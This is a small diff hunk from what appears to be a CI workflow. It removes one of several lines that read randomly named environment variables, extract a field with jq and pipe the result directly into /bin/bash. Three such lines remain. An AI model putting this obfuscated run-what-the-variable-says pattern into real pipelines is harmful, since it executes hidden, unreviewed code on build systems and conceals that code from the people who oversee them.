@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ptofv85373" | jq -r .rmswu14 | /bin/bash
           echo $jjeg814 | jq -r .spbf7517 | /bin/bash
           echo $prjc2 | jq -r .cmp4341 | /bin/bash
-          printf '%s' "$cad51166" | jq -r .pippk9403 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
